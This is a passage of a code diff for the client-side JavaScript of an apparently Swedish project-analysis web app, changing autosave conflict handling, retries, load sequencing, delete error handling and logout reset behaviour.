+      // case, not an edge one.
+      as_built_data: Object.keys(state.as_built || {}).length ? state.as_built : null,
+      // Own column (§14.3), and null when the last file is removed so the row
+      // stops pointing at files that are gone.
+      attachments_data: (state.attachments && state.attachments.length) ? state.attachments : null,
+      // Own column (§13.2), null for an empty sheet so the row carries nothing it
+      // does not need.
+      sheet_data: (state.sheet && state.sheet.blocks && state.sheet.blocks.length) ? state.sheet : null,
+      property_ref: state.propertyRef || null,
+      // The month input gives 'YYYY-MM'; the column is a DATE, so anchor it to the
+      // first of the month. We only ever show the month back, so the day is a
+      // storage detail and never a claim about precision we do not have.
+      planned_start: state.plannedStart ? (state.plannedStart + '-01') : null,
+    };
     if (currentAnalysisId) {
+      const body = _analysisUpdatedAt
+        ? Object.assign({expected_updated_at: _analysisUpdatedAt}, analysisData) : analysisData;
       const r = await authFetch('/api/analyses/' + currentAnalysisId, {
         method: 'PUT', headers: {'Content-Type':'application/json'},
-        body: JSON.stringify(analysisData),
+        body: JSON.stringify(body),
       });
-      await r.json();
+      const result = await r.json();
+      if (r.status === 409 && result && result.conflict) {
+        if (indicator) { indicator.textContent = 'Sparfel'; indicator.title = reason(r, result); indicator.style.color = 'var(--kk-dark-red)'; }
+        // The reload is kept, so a switch waiting on this save can wait for it too.
+        if (epoch === analysisEpoch) {
+          // Cleared only by its own reload: a second conflict's handle must
+          // survive the first one settling.
+          const reload = handleSaveConflict().finally(() => { if (_conflictReload === reload) _conflictReload = null; });
+          _conflictReload = reload;
+        }
+        ok = 'conflict';
+        return ok;
+      }
+      if (failed(r, result)) throw new Error(reason(r, result));
+      if (epoch === analysisEpoch && result.updated_at) _analysisUpdatedAt = result.updated_at;
     } else {
       const r = await authFetch('/api/analyses', {
         method: 'POST', headers: {'Content-Type':'application/json'},
         body: JSON.stringify(analysisData),
       });
       const result = await r.json();
-      if (result && result.id) {
+      if (failed(r, result) || !result.id) throw new Error(reason(r, result));
+      // The row belongs to the analysis this save was made from. If the user
+      // has moved on, it stays in the list under that name and the view on
+      // screen keeps its own id.
+      if (epoch === analysisEpoch) {
         currentAnalysisId = result.id;
+        _analysisUpdatedAt = result.updated_at || null;
         // The chat written before the row existed sits in the 'new' bucket.
         // Move it to this analysis's key so a reload before the next autosave
-        // still finds it locally.
-        try { localStorage.removeItem('aida_chat_new'); } catch(e) {}
-        _saveConversation();
-        await loadAnalysesList();
+        // still finds it locally. Written directly: _saveConversation would
+        // schedule a second save of what this POST just stored.
+        try {
+          localStorage.removeItem('aida_chat_new');
+          localStorage.setItem(_chatStorageKey(), JSON.stringify(state.conversation));
+        } catch(e) {}
       }
+      await loadAnalysesList();
     }
-    if (indicator) { indicator.textContent = 'Sparat'; indicator._hide = setTimeout(() => { indicator.style.visibility = 'hidden'; }, 2000); }
+    _saveRetryArmed = false;
+    ok = true;
+    if (indicator) { indicator.textContent = 'Sparat'; indicator.title = ''; indicator.style.color = 'var(--kk-gray-400)'; indicator._hide = setTimeout(() => { indicator.style.visibility = 'hidden'; }, 2000); }
   } catch (e) {
     console.error('Auto-save failed:', e);
-    if (indicator) { indicator.textContent = 'Sparfel'; indicator.style.color = 'var(--kk-dark-red)'; }
+    if (indicator) { indicator.textContent = 'Sparfel'; indicator.title = 'Ändringarna är inte sparade: ' + e.message; indicator.style.color = 'var(--kk-dark-red)'; }
+    // Most failures are passing (a cold start, a timeout). One retry on its
+    // own; if that fails too the red indicator stays until the next edit.
+    if (!_saveRetryArmed && epoch === analysisEpoch && !saveTimeout) {
+      _saveRetryArmed = true;
+      saveTimeout = setTimeout(() => { saveTimeout = null; return autoSave(); }, 5000);
+    }
   }
-  finally { saveInProgress = false; }
+  finally { saveInProgress = false; _savePromise = null; saveDone(ok); }
+  return ok;
 }
 
 if (HAS_SUPABASE && SUPABASE_URL && SUPABASE_ANON_KEY) {
@@ -6972,10 +7412,14 @@ function toggleAuthMode(e) {
 }
 
 async function handleLogout() {
+  // After signOut autoSave has no user and returns, so a waiting edit would
+  // simply vanish.
+  if (!(await leaveCurrentAnalysis())) return;
   await supabaseClient.auth.signOut();
   currentUser = null;
-  currentAnalysisId = null;
-  analysisEpoch++;
+  // The same reset as "Nytt projekt": without it the previous user's analysis
+  // stayed on screen, and the next user's first edit saved it as a row of theirs.
+  await createNewProject({force: true, discardPending: true});
   showAuth();
 }
 
@@ -7075,7 +7519,16 @@ async function loadAnalysesList() {
         del.onclick = async (e) => {
           e.stopPropagation();
           if (!confirm('Ta bort "' + (a.name || 'Nytt projekt') + '"?')) return;
-          try { await authFetch('/api/analyses/' + a.id, {method:'DELETE'}); if (a.id === currentAnalysisId) createNewProject(); await loadAnalysesList(); } catch(ex) { alert('Kunde inte ta bort.'); }
+          try {
+            const r = await authFetch('/api/analyses/' + a.id, {method:'DELETE'});
+            const d = await r.json();
+            // A refused delete must leave the view alone: clearing it for a
+            // row that still exists looks like the delete worked.
+            if (!r.ok || (d && d.error)) { alert('Kunde inte ta bort: ' + ((d && d.error) || ('HTTP ' + r.status))); return; }
+            // The row is gone, so a pending edit has nowhere to go.
+            if (a.id === currentAnalysisId) await createNewProject({force: true, discardPending: true});
+            await loadAnalysesList();
+          } catch(ex) { alert('Kunde inte ta bort.'); }
         };
         item.appendChild(del);
         container.appendChild(item);
@@ -7087,14 +7540,34 @@ async function loadAnalysesList() {
   } catch(e) { console.error('Failed to load list:', e); return null; }
 }
 
-async function loadAnalysis(id) {
-  if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
+// opts.force: skip the questions (a reload after a save conflict is not the
+// user leaving anything).
+async function loadAnalysis(id, opts) {
+  opts = opts || {};
+  if (!opts.force) {
+    if (!confirmLeaveDuringRun()) return;
+    if (!(await leaveCurrentAnalysis())) return;
+  }
+  const seq = ++_loadSeq;
+  // A newer load supersedes a pending conflict reload; later switches must not
+  // wait on one that can no longer draw.
+  _conflictReload = null;
   try {
     const r = await authFetch('/api/analyses/' + id);
     const data = await r.json();
-    if (!data || data.error) return;
+    // Another analysis, or a new project, was asked for while this one loaded.
+    if (seq !== _loadSeq) return;
+    if (!r.ok || !data || data.error) {
+      showNotice('Kunde inte öppna projektet: ' + ((data && data.error) || ('HTTP ' + r.status)) + '. Försök igen om en stund.');
+      return;
+    }
     currentAnalysisId = id;
     analysisEpoch++;
+    _analysisUpdatedAt = data.updated_at || null;
+    _saveRetryArmed = false;
+    // A step still running belongs to the analysis left behind; its answer is
+    // dropped when it lands (lateReply), so this one must not wait for it.
+    setLoading(false);
     // Increment 4: the analysis carries its own conversation, so switching
     // project swaps the whole transcript AND the model's context together. The
     // previous project's turns cannot leak in, because they are not in this
@@ -7149,9 +7622,18 @@ async function loadAnalysis(id) {
     sheetDraft = null;
     document.getElementById('projectName').textContent = data.name || 'Nytt projekt';
     restoreUI();
+    // Drawing the analysis is not an edit. restoreUI's greeting for an analysis
+    // without a stored conversation goes through addMsg, which schedules a
+    // save; left alone, merely opening an analysis would write every column
+    // back two seconds later.
+    if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
     renderAttachmentTray();
     await loadAnalysesList();
-  } catch(e) { console.error('Failed to load analysis:', e); }
+    return true;
+  } catch(e) {
+    console.error('Failed to load analysis:', e);
+    showNotice('Kunde inte öppna analysen. Kontrollera nätverket och försök igen.');
+  }
 }
 
 function restoreUI() {
@@ -7226,11 +7708,22 @@ function restoreUI() {
   if (isFollowup()) refreshFollowup();
 }
 
-function createNewProject() {
+// opts.force: skip the questions. opts.discardPending: drop a waiting edit
+// instead of saving it (the row it belongs to was just deleted).
+async function createNewProject(opts) {
+  opts = opts || {};
   // Without an account nothing is saved, so a reset here is the only way to
   // lose the current description. With Supabase the old project stays in the
   // list and this is just a switch.
   if (!HAS_SUPABASE && state.project && !confirm('Börja om med ett nytt projekt? Det du beskrivit försvinner.')) return;
+  if (!opts.force && !confirmLeaveDuringRun()) return;
+  if (opts.discardPending) {
+    if (saveTimeout) { clearTimeout(saveTimeout); saveTimeout = null; }
+  } else if (!(await leaveCurrentAnalysis())) {
+    return;
+  }
+  _saveRetryArmed = false;
+  _analysisUpdatedAt = null;
   // Close, never toggle: this runs from the top-bar button too, where the menu
   // is already closed and a toggle would open it on top of the fresh project.
   const menu = document.getElementById('projectMenu');
@@ -7239,6 +7732,8 @@ function createNewProject() {
   // previous project's saved chat log (which must survive switching back).
   currentAnalysisId = null;
   analysisEpoch++;
+  _loadSeq++;
+  _conflictReload = null;
   try { localStorage.removeItem(_chatStorageKey()); } catch(e) {}
   state.conversation = [];
   state.project = null; state.baseline = null; state.alternatives = null;
